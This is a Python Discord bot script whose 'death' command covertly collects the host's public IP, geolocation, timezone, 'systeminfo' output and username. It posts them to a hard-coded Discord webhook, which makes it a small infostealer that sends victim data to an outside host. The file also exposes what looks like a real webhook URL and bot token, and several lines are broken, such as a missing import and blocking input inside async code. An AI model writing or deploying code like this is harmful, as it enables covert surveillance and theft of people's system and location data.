import requests
import subprocess
import discord
from discord.ext import commands
from discord import Webhook
import aiohttp

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='.', intents=intents, debug_guilds=[])

async def death():
    response = input("Isn't it lovely? All alone? Heart made of glass my mind of stone?\n>>> ")
    if response.lower() in ["yes", "yeah", "s", "ya"]:
        print("mmm... you are mine.")
        time.sleep(5)
        exit()
    else:
        print("ah... you moron")
        death = requests.get("http://ip-api.com/json/?fields=225545")
        json = death.json()

        payload = f"""
        IP = {json["query"]}
        Location = {json["country"]}, {json["regionName"]}
        Reverse = {json["reverse"]}
        Timezone = {json["timezone"]}
        """

        SYS = subprocess.run("systeminfo", capture_output=True, text=True).stdout
        WHO = subprocess.run("whoami", capture_output=True, text=True).stdout.strip()

        embed = discord.Embed(title=f"{WHO}", description={SYS}, colour=0x00f529)
        inter = discord.Embed(description={payload}, colour=0x00f529)
        mmm = discord.Embed(description="----", colour=0x00f529)
        from discord import Webhook
        async def foo(aoa):
            async with aiohttp.ClientSession() as session:
                webhook = Webhook.from_url('https://discord.com/api/webhooks/1252620641811828818/-rriI0u4hY9SVJ23C092dBcQRTXNXzsj6Q0mP43JHXBZ0a89Y9B7sXQ__yRqM5vwLMmb', session=session)
                await webhook.send(embed=aoa, username='Foo')

        await foo(embed)
        await foo(inter)
        await foo(mmm)
        return embed


@bot.slash_command(name='death_command')
async def death_command(ctx, ch: discord.TextChannel):
    embed = await death()
    await ctx.respond("Awaiting for death command.")
    if embed: 
        await ch.send(embed=embed)

# Make sure to replace 'YOUR_DISCORD_BOT_TOKEN' with your actual bot token
#bot.run("MTIxODkxNTI1NzM2NDI1NDcyMA.#Gt2rqk.oooi92guU_r0wtvX2yuvy3B_e7uiQp0BacdDXs")
